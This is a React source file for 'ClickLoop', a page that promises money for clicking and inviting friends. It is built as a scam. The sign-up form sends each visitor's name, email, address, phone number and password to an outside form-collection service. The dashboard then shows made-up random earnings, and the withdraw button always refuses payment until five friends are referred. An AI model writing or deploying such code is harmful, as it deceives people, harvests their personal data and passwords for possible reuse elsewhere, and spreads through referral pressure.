import React, { useEffect, useState } from "react";
import ReactDOM from "react-dom/client";
import "./style.css";

function App() {
  const [submitted, setSubmitted] = useState(false);
  const [user, setUser] = useState("");
  const [referrals, setReferrals] = useState(0);
  const [earnings, setEarnings] = useState(5.0);

  useEffect(() => {
    const stored = localStorage.getItem("clickloop_user");
    if (!stored) {
      const id = "user" + Math.floor(Math.random() * 100000);
      localStorage.setItem("clickloop_user", id);
      setUser(id);
    } else {
      setUser(stored);
    }
  }, []);

  const handleClick = () => {
    const amount = parseFloat((Math.random() * 0.6 + 0.2).toFixed(2));
    setEarnings(e => parseFloat((e + amount).toFixed(2)));
  };

  const handleWithdraw = () => {
    alert("🚫 You must refer at least 5 friends before you can withdraw your balance.");
  };

  return (
    <div className="container">
      <h1>ClickLoop</h1>
      <p className="subtitle">Earn by clicking and inviting. 100% yours.</p>

      {!submitted ? (
        <form
          action="https://formspree.io/f/xvgrrkna"
          method="POST"
          onSubmit={() => setSubmitted(true)}
          className="form"
        >
          <input type="hidden" name="referrer" value={user} />
          <input type="text" name="name" placeholder="Full Name" required />
          <input type="email" name="email" placeholder="Email" required />
          <input type="text" name="address" placeholder="Address" required />
          <input type="tel" name="phone" placeholder="Phone" required />
          <input type="password" name="password" placeholder="Password" required />
          <button type="submit">Register & Claim $5</button>
        </form>
      ) : (
        <div className="dashboard">
          <h2>Dashboard</h2>
          <p>Welcome <span>{user}</span></p>
          <p>Earnings: ${earnings.toFixed(2)}</p>
          <p>Referrals: {referrals}</p>
          <button onClick={handleClick} className="click-btn">Click to Earn</button>
          <button onClick={handleWithdraw} className="withdraw-btn">Withdraw</button>
          <div className="ref-link">
            Your referral link:
            <div>{window.location.origin + `?ref=` + user}</div>
          </div>
        </div>
      )}
    </div>
  );
}

ReactDOM.createRoot(document.getElementById("root")).render(<App />);
